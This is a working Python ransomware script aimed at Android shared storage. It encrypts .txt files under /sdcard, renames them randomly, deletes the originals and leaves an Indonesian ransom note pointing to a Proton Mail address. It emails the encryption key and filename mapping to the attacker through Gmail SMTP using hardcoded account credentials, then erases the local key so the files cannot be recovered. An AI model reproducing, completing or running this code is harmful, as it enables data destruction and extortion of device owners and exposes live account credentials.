#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import json
import random
import string
import logging
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET_DIR = "/sdcard"
EXTENSIONS = ['.txt']

NOTE_MESSAGE = "Mulai --> Selesai"
KEY_FILE = ".key"
MAP_FILE = ".map.json"
THREADS = 10

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_PENGIRIM = "systemprivate2030@gmail.com"
PASSWORD_PENGIRIM = "lkqd uomf qsra tpfe"
EMAIL_PENERIMA = "MyBion@proton.me"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def random_filename(extension, length=200):
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return name + extension

def generate_key():
    return Fernet.generate_key()

def save_key(key, key_path):
    with open(key_path, 'wb') as f:
        f.write(key)

def encrypt_file(filepath, cipher, mapping):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        
        encrypted_data = cipher.encrypt(data)
        
        dir_name = os.path.dirname(filepath)
        ext = os.path.splitext(filepath)[1]
        new_name = random_filename(ext)
        new_path = os.path.join(dir_name, new_name)
        
        with open(new_path, 'wb') as f:
            f.write(encrypted_data)
        
        os.remove(filepath)
        
        mapping[new_path] = filepath
        
        return True
    except Exception as e:
        return False

def find_files(target_dir, extensions):
    files = []
    for root, dirs, filenames in os.walk(target_dir):
        for f in filenames:
  
            if f == KEY_FILE or f == MAP_FILE:
                continue
            if any(f.lower().endswith(ext.lower()) for ext in extensions):
                files.append(os.path.join(root, f))
    return files

def save_mapping(mapping, map_path):
    with open(map_path, 'w') as f:
        json.dump(mapping, f, indent=2)

def leave_note(target_dir, device_id):
    note_path = os.path.join(target_dir, "Pesan.txt")
    note_content = f"""
Hai, semua file Anda telah dienkripsi, Kemungkinan tidak dapat di kembalikan lagi seperti semula.

kirim pesan ke email

"MyBion@proton.me"

jika ingin komplen, 
"""
    with open(note_path, 'w') as f:
        f.write(note_content)

def send_email(key_path, map_path, recipient_email):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_PENGIRIM
        msg['To'] = recipient_email
        msg['Subject'] = "Kunci dan Mapping Ransomware"

        body = "Berikut adalah file kunci dan mapping yang dihasilkan."
        msg.attach(MIMEText(body, 'plain'))

        with open(key_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{KEY_FILE}"')
            msg.attach(part)

        with open(map_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{MAP_FILE}"')
            msg.attach(part)

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_PENGIRIM, PASSWORD_PENGIRIM)
        server.send_message(msg)
        server.quit()

        return True
    except Exception as e:
        return False

def delete_key_and_map(target_dir):
    key_path = os.path.join(target_dir, KEY_FILE)
    map_path = os.path.join(target_dir, MAP_FILE)
    
    deleted = False
    if os.path.exists(key_path):
        os.remove(key_path)
        deleted = True
    if os.path.exists(map_path):
        os.remove(map_path)
        deleted = True

def main():
    if not os.path.isdir(TARGET_DIR):
        sys.exit(1)

    key_path = os.path.join(TARGET_DIR, KEY_FILE)
    if os.path.exists(key_path):
        sys.exit(1)

    key = generate_key()
    save_key(key, key_path)

    cipher = Fernet(key)

    files = find_files(TARGET_DIR, EXTENSIONS)

    if not files:
        if os.path.exists(key_path):
            os.remove(key_path)
        return

    mapping = {}

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(encrypt_file, f, cipher, mapping): f for f in files}
        for future in as_completed(futures):
            future.result()

    map_path = os.path.join(TARGET_DIR, MAP_FILE)
    save_mapping(mapping, map_path)

    device_id = os.popen('getprop ro.serialno').read().strip() or "UNKNOWN"
    leave_note(TARGET_DIR, device_id)

    send_email(key_path, map_path, EMAIL_PENERIMA)

    delete_key_and_map(TARGET_DIR)


if __name__ == "__main__":
    main()